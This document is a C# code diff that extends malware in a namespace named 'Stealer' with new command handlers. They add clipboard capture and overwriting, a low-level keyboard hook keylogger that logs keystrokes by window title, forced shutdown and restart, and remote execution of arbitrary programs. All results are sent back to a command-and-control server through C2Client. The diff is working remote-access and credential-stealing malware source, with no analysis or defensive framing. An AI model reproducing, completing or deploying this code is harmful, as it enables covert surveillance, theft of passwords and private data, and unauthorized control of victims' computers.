@@ -170,6 +170,48 @@ namespace Stealer
                 if (sep > 0)
                     FmUploadFile(rest.Substring(0, sep), rest.Substring(sep + 1));
             }
+            // ── Clipboard ─────────────────────────────────────────────────────
+            else if (cmdLower == "clipboard_get")
+            {
+                ClipboardGet();
+            }
+            else if (cmdLower.StartsWith("clipboard_set:"))
+            {
+                ClipboardSet(cmd.Substring("clipboard_set:".Length));
+            }
+            // ── Keylogger ─────────────────────────────────────────────────────
+            else if (cmdLower == "keylog_start")
+            {
+                KeylogStart();
+            }
+            else if (cmdLower == "keylog_stop")
+            {
+                KeylogStop();
+            }
+            // ── Power ─────────────────────────────────────────────────────────
+            else if (cmdLower == "power_shutdown")
+            {
+                Process.Start(new ProcessStartInfo("shutdown", "/s /t 0")
+                    { CreateNoWindow = true, UseShellExecute = false });
+            }
+            else if (cmdLower == "power_restart")
+            {
+                Process.Start(new ProcessStartInfo("shutdown", "/r /t 0")
+                    { CreateNoWindow = true, UseShellExecute = false });
+            }
+            else if (cmdLower == "power_sleep")
+            {
+                Task.Run(() => SetSuspendState(false, false, false));
+            }
+            // ── Remote Execution ──────────────────────────────────────────────
+            else if (cmdLower.StartsWith("remote_exec:"))
+            {
+                string rest = cmd.Substring("remote_exec:".Length);
+                int sep = rest.IndexOf('|');
+                string exePath = sep > 0 ? rest.Substring(0, sep) : rest;
+                string exeArgs = sep > 0 ? rest.Substring(sep + 1) : "";
+                RemoteExec(exePath, exeArgs);
+            }
         }
 
         private static Encoding OemEnc => Encoding.GetEncoding(CultureInfo.CurrentCulture.TextInfo.OEMCodePage);
@@ -377,6 +419,315 @@ namespace Stealer
                     C2Client.SendText("{\"type\":\"kill_res\",\"success\":false,\"pid\":" + pid + ",\"error\":\"" + errEsc + "\"}");
                 }
             });
+        }
+
+        // ── Remote Execution ─────────────────────────────────────────────────
+
+        private static void RemoteExec(string path, string args)
+        {
+            Task.Run(() =>
+            {
+                try
+                {
+                    var psi = new ProcessStartInfo
+                    {
+                        FileName        = path,
+                        Arguments       = args,
+                        UseShellExecute = true,
+                    };
+                    Process.Start(psi);
+                    C2Client.SendText("{\"type\":\"exec_res\",\"success\":true,\"path\":\"" + path.Replace("\\","\\\\").Replace("\"","\\\"") + "\"}");
+                }
+                catch (Exception ex)
+                {
+                    string err = ex.Message.Replace("\\","\\\\").Replace("\"","\\\"");
+                    C2Client.SendText("{\"type\":\"exec_res\",\"success\":false,\"error\":\"" + err + "\"}");
+                }
+            });
+        }
+
+        // ── Power ─────────────────────────────────────────────────────────────
+
+        [System.Runtime.InteropServices.DllImport("powrprof.dll", SetLastError = true)]
+        private static extern bool SetSuspendState(bool hibernate, bool forceCritical, bool disableWakeEvent);
+
+        // ── Clipboard ─────────────────────────────────────────────────────────
+
+        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern bool OpenClipboard(IntPtr hWnd);
+        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern bool CloseClipboard();
+        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern IntPtr GetClipboardData(uint uFormat);
+        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern bool EmptyClipboard();
+        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern IntPtr SetClipboardData(uint uFormat, IntPtr hMem);
+        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern bool IsClipboardFormatAvailable(uint format);
+        [System.Runtime.InteropServices.DllImport("kernel32.dll")] private static extern IntPtr GlobalLock(IntPtr hMem);
+        [System.Runtime.InteropServices.DllImport("kernel32.dll")] private static extern bool GlobalUnlock(IntPtr hMem);
+        [System.Runtime.InteropServices.DllImport("kernel32.dll")] private static extern IntPtr GlobalAlloc(uint uFlags, UIntPtr dwBytes);
+        [System.Runtime.InteropServices.DllImport("kernel32.dll")] private static extern IntPtr GlobalSize(IntPtr hMem);
+
+        private const uint CF_UNICODETEXT = 13;
+        private const uint CF_BITMAP      = 2;
+        private const uint CF_DIB         = 8;
+        private const uint GMEM_MOVEABLE  = 0x0002;
+
+        private static string EscJson(string s) =>
+            (s ?? "").Replace("\\","\\\\").Replace("\"","\\\"")
+                     .Replace("\r","\\r").Replace("\n","\\n").Replace("\t","\\t");
+
+        private static void ClipboardGet()
+        {
+            var t = new Thread(() =>
+            {
+                try
+                {
+                    if (!OpenClipboard(IntPtr.Zero)) { C2Client.SendText("{\"type\":\"clipboard_res\",\"error\":\"OpenClipboard failed\"}"); return; }
+                    string text = "";
+                    string imgB64 = null;
+                    try
+                    {
+                        // Text
+                        if (IsClipboardFormatAvailable(CF_UNICODETEXT))
+                        {
+                            IntPtr hText = GetClipboardData(CF_UNICODETEXT);
+                            if (hText != IntPtr.Zero)
+                            {
+                                IntPtr ptr = GlobalLock(hText);
+                                if (ptr != IntPtr.Zero)
+                                {
+                                    text = System.Runtime.InteropServices.Marshal.PtrToStringUni(ptr) ?? "";
+                                    GlobalUnlock(hText);
+                                }
+                            }
+                        }
+                        // Image via HBITMAP → System.Drawing
+                        if (IsClipboardFormatAvailable(CF_BITMAP))
+                        {
+                            IntPtr hBmp = GetClipboardData(CF_BITMAP);
+                            if (hBmp != IntPtr.Zero)
+                            {
+                                try
+                                {
+                                    using (var bmp = System.Drawing.Image.FromHbitmap(hBmp))
+                                    using (var ms = new System.IO.MemoryStream())
+                                    {
+                                        bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
+                                        imgB64 = Convert.ToBase64String(ms.ToArray());
+                                    }
+                                }
+                                catch { }
+                            }
+                        }
+                    }
+                    finally { CloseClipboard(); }
+
+                    string imgPart = imgB64 != null ? ",\"image\":\"" + imgB64 + "\"" : "";
+                    C2Client.SendText("{\"type\":\"clipboard_res\",\"text\":\"" + EscJson(text) + "\"" + imgPart + "}");
+                }
+                catch (Exception ex)
+                {
+                    C2Client.SendText("{\"type\":\"clipboard_res\",\"error\":\"" + EscJson(ex.Message) + "\"}");
+                }
+            });
+            t.SetApartmentState(ApartmentState.STA);
+            t.IsBackground = true;
+            t.Start();
+        }
+
+        private static void ClipboardSet(string text)
+        {
+            var t = new Thread(() =>
+            {
+                try
+                {
+                    if (!OpenClipboard(IntPtr.Zero)) return;
+                    try
+                    {
+                        EmptyClipboard();
+                        int byteLen = (text.Length + 1) * 2;
+                        IntPtr hMem = GlobalAlloc(GMEM_MOVEABLE, (UIntPtr)byteLen);
+                        if (hMem == IntPtr.Zero) return;
+                        IntPtr ptr = GlobalLock(hMem);
+                        if (ptr != IntPtr.Zero)
+                        {
+                            System.Runtime.InteropServices.Marshal.Copy(text.ToCharArray(), 0, ptr, text.Length);
+                            System.Runtime.InteropServices.Marshal.WriteInt16(ptr, text.Length * 2, 0);
+                            GlobalUnlock(hMem);
+                        }
+                        SetClipboardData(CF_UNICODETEXT, hMem);
+                    }
+                    finally { CloseClipboard(); }
+                }
+                catch { }
+            });
+            t.SetApartmentState(ApartmentState.STA);
+            t.IsBackground = true;
+            t.Start();
+        }
+
+        // ── Keylogger ─────────────────────────────────────────────────────────
+
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
+        private struct KBDLLHOOKSTRUCT
+        {
+            public uint vkCode, scanCode, flags, time;
+            public IntPtr dwExtraInfo;
+        }
+
+        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
+        private struct MSG_
+        {
+            public IntPtr hwnd;
+            public uint message;
+            public IntPtr wParam, lParam;
+            public uint time;
+            public int ptX, ptY;
+        }
+
+        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc fn, IntPtr hMod, uint threadId);
+        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern bool GetMessage(out MSG_ lpMsg, IntPtr hWnd, uint min, uint max);
+        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern bool TranslateMessage(ref MSG_ msg);
+        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern IntPtr DispatchMessage(ref MSG_ msg);
+        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern void PostThreadMessage(uint threadId, uint msg, IntPtr wParam, IntPtr lParam);
+        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern IntPtr GetForegroundWindow();
+        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder sb, int max);
+        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern short GetKeyState(int vk);
+        [System.Runtime.InteropServices.DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string name);
+        [System.Runtime.InteropServices.DllImport("kernel32.dll")] private static extern uint GetCurrentThreadId();
+
+        private static Thread       _keylogThread;
+        private static IntPtr       _keylogHook   = IntPtr.Zero;
+        private static volatile bool _keylogActive = false;
+        private static uint          _keylogTid    = 0;
+        private static LowLevelKeyboardProc _keylogProc; // prevent GC
+        private static string        _keylogLastWindow = "";
+        private static readonly System.Text.StringBuilder _keylogBuf  = new System.Text.StringBuilder();
+        private static readonly object                     _keylogLock = new object();
+        private static System.Timers.Timer _keylogTimer;
+
+        private static string VkToStr(uint vk)
+        {
+            bool shift = (GetKeyState(0x10) & 0x8000) != 0;
+            bool caps  = (GetKeyState(0x14) & 0x0001) != 0;
+            // Letters
+            if (vk >= 0x41 && vk <= 0x5A)
+            {
+                char c = (char)vk;
+                return ((shift ^ caps) ? c : char.ToLower(c)).ToString();
+            }
+            // Digits row
+            if (vk >= 0x30 && vk <= 0x39)
+            {
+                if (!shift) return ((char)vk).ToString();
+                string[] s = { ")", "!", "@", "#", "$", "%", "^", "&", "*", "(" };
+                return s[vk - 0x30];
+            }
+            // Numpad digits
+            if (vk >= 0x60 && vk <= 0x69) return ((char)('0' + vk - 0x60)).ToString();
+            switch (vk)
+            {
+                case 0x08: return "[BS]";
+                case 0x09: return "[Tab]";
+                case 0x0D: return "\n";
+                case 0x1B: return "[Esc]";
+                case 0x20: return " ";
+                case 0x2E: return "[Del]";
+                case 0x6A: return "*"; case 0x6B: return "+";
+                case 0x6D: return "-"; case 0x6E: return "."; case 0x6F: return "/";
+                case 0xBB: return shift ? "+" : "=";
+                case 0xBC: return shift ? "<" : ",";
+                case 0xBD: return shift ? "_" : "-";
+                case 0xBE: return shift ? ">" : ".";
+                case 0xBF: return shift ? "?" : "/";
+                case 0xC0: return shift ? "~" : "`";
+                case 0xDB: return shift ? "{" : "[";
+                case 0xDC: return shift ? "|" : "\\";
+                case 0xDD: return shift ? "}" : "]";
+                case 0xDE: return shift ? "\"" : "'";
+                default:   return "";
+            }
+        }
+
+        private static IntPtr KeylogCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && (wParam == (IntPtr)0x100 || wParam == (IntPtr)0x104)) // WM_KEYDOWN / WM_SYSKEYDOWN
+            {
+                var kbs = System.Runtime.InteropServices.Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
+                string key = VkToStr(kbs.vkCode);
+
+                // Detect active window change
+                IntPtr hwnd = GetForegroundWindow();
+                var sb = new System.Text.StringBuilder(256);
+                GetWindowText(hwnd, sb, 256);
+                string win = sb.ToString();
+                if (win != _keylogLastWindow)
+                {
+                    _keylogLastWindow = win;
+                    lock (_keylogLock) { _keylogBuf.Append("\n[" + win + "]\n"); }
+                }
+
+                if (key.Length > 0)
+                    lock (_keylogLock) { _keylogBuf.Append(key); }
+            }
+            return CallNextHookEx(_keylogHook, nCode, wParam, lParam);
+        }
+
+        private static void KeylogFlush()
+        {
+            string batch;
+            lock (_keylogLock)
+            {
+                if (_keylogBuf.Length == 0) return;
+                batch = _keylogBuf.ToString();
+                _keylogBuf.Clear();
+            }
+            C2Client.SendText("{\"type\":\"keylog_data\",\"text\":\"" + EscJson(batch) + "\"}");
+        }
+
+        private static void KeylogStart()
+        {
+            if (_keylogActive) return;
+            _keylogActive = true;
+            _keylogLastWindow = "";
+
+            _keylogTimer = new System.Timers.Timer(400);
+            _keylogTimer.Elapsed += (s, e) => KeylogFlush();
+            _keylogTimer.Start();
+
+            _keylogThread = new Thread(() =>
+            {
+                _keylogTid  = GetCurrentThreadId();
+                _keylogProc = KeylogCallback;
+                using (var proc = Process.GetCurrentProcess())
+                using (var mod  = proc.MainModule)
+                    _keylogHook = SetWindowsHookEx(13, _keylogProc, GetModuleHandle(mod.ModuleName), 0);
+
+                MSG_ msg;
+                while (GetMessage(out msg, IntPtr.Zero, 0, 0))
+                {
+                    TranslateMessage(ref msg);
+                    DispatchMessage(ref msg);
+                }
+                if (_keylogHook != IntPtr.Zero) { UnhookWindowsHookEx(_keylogHook); _keylogHook = IntPtr.Zero; }
+            });
+            _keylogThread.SetApartmentState(ApartmentState.STA);
+            _keylogThread.IsBackground = true;
+            _keylogThread.Start();
+
+            C2Client.SendText("{\"type\":\"keylog_status\",\"active\":true}");
+        }
+
+        private static void KeylogStop()
+        {
+            if (!_keylogActive) return;
+            _keylogActive = false;
+            _keylogTimer?.Stop();
+            _keylogTimer = null;
+            KeylogFlush(); // send remaining buffer
+            if (_keylogTid != 0) PostThreadMessage(_keylogTid, 0x0012 /*WM_QUIT*/, IntPtr.Zero, IntPtr.Zero);
+            C2Client.SendText("{\"type\":\"keylog_status\",\"active\":false}");
         }
 
         // ── Shell icon extraction via WinAPI ──────────────────────────────────
